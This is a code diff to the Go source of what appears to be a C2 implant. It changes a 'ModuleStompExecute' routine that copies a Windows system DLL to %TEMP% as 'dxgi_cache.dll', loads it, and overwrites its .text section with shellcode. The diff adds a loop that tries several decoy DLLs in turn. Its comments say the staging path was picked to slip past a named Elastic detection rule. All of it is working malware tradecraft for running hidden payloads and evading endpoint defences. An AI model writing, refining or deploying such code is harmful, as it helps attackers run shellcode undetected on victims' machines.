@@ -43,6 +43,7 @@ import (
 	"fmt"
 	"os"
 	"path/filepath"
+	"strings"
 	"unsafe"
 
 	//{{if .Config.Debug}}
@@ -55,6 +56,18 @@ import (
 // sysDllSource is the decoy source copied to %TEMP% when no path is given.
 // combase.dll (~0.9 MB .text) comfortably fits implant shellcode.
 const sysDllSource = `C:\Windows\System32\combase.dll`
+
+// decoySources — candidates tried in order. A decoy that is ALREADY loaded in
+// the process (under its System32 path) will have its DllMain re-executed when
+// the %TEMP% copy is LoadLibrary'd, and runtime DLLs like combase FAIL on
+// double-init ("DLL initialization routine failed") — e.g. after the CLR host
+// (execute_assembly) pulls COM into the process. mscms/dbgcore have trivial
+// DllMains and are not pulled in by the Go runtime, so they come first.
+var decoySources = []string{
+	`C:\Windows\System32\mscms.dll`,
+	`C:\Windows\System32\dbgcore.dll`,
+	sysDllSource, // combase: large .text, last resort
+}
 
 // StompResult reports where the payload was placed and executed from.
 type StompResult struct {
@@ -80,21 +93,42 @@ func ModuleStompExecute(data []byte, dllPath string) (*StompResult, error) {
 		return nil, err
 	}
 
-	// 0. Materialize a decoy DLL outside System32 if none supplied
+	// 0. Materialize a decoy DLL outside System32 if none supplied.
+	// Multiple candidates are tried: a decoy already initialized in the
+	// process fails LoadLibrary on double-init and we move to the next.
+	var loadErrs []string
 	if dllPath == "" {
-		p, err := stageDecoyDLL()
-		if err != nil {
-			return nil, fmt.Errorf("ModuleStomp decoy staging: %w", err)
+		for _, src := range decoySources {
+			p, err := stageDecoyDLLFrom(src)
+			if err != nil {
+				loadErrs = append(loadErrs, fmt.Sprintf("stage %s: %v", src, err))
+				continue
+			}
+			hMod, err := winLoadLibrary(p)
+			if err != nil {
+				loadErrs = append(loadErrs, fmt.Sprintf("LoadLibraryW(%s): %v", p, err))
+				continue
+			}
+			//{{if .Config.Debug}}
+			log.Printf("[ModuleStomp] decoy %s mapped at 0x%x\n", p, uintptr(hMod))
+			//{{end}}
+			dllPath = p
+			return stompIntoModule(data, dllPath, uintptr(hMod))
 		}
-		dllPath = p
+		return nil, fmt.Errorf("ModuleStomp: all decoy candidates failed: %s", strings.Join(loadErrs, "; "))
 	}
 
-	// 1. Map the decoy as MEM_IMAGE
+	// 1. Map the decoy as MEM_IMAGE (explicit path supplied by the caller)
 	hMod, err := winLoadLibrary(dllPath)
 	if err != nil {
 		return nil, fmt.Errorf("LoadLibraryW(%s): %w", dllPath, err)
 	}
-	base := uintptr(hMod)
+	return stompIntoModule(data, dllPath, uintptr(hMod))
+}
+
+// stompIntoModule performs steps 2-6 of ModuleStompExecute against an
+// already-mapped decoy module.
+func stompIntoModule(data []byte, dllPath string, base uintptr) (*StompResult, error) {
 
 	// 2. Parse PE headers → find .text
 	dosMagic := *(*uint16)(unsafe.Pointer(base))
@@ -186,17 +220,17 @@ func ModuleStompExecute(data []byte, dllPath string) (*StompResult, error) {
 	}, nil
 }
 
-// stageDecoyDLL copies the decoy source DLL to %TEMP% with a random-looking
-// name. The copy lands OUTSIDE System32/SysWOW64 — outside the regex scope
-// of Elastic's image_hollow_from_unusual_stack rule.
-func stageDecoyDLL() (string, error) {
+// stageDecoyDLLFrom copies the given decoy source DLL to %TEMP% with a
+// random-looking name. The copy lands OUTSIDE System32/SysWOW64 — outside the
+// regex scope of Elastic's image_hollow_from_unusual_stack rule.
+func stageDecoyDLLFrom(src string) (string, error) {
 	tmp := os.TempDir()
 	dst := filepath.Join(tmp, "dxgi_cache.dll")
-	src, err := os.ReadFile(sysDllSource)
+	data, err := os.ReadFile(src)
 	if err != nil {
-		return "", fmt.Errorf("read decoy source %s: %w", sysDllSource, err)
+		return "", fmt.Errorf("read decoy source %s: %w", src, err)
 	}
-	if err := os.WriteFile(dst, src, 0o644); err != nil {
+	if err := os.WriteFile(dst, data, 0o644); err != nil {
 		return "", fmt.Errorf("write decoy %s: %w", dst, err)
 	}
 	return dst, nil
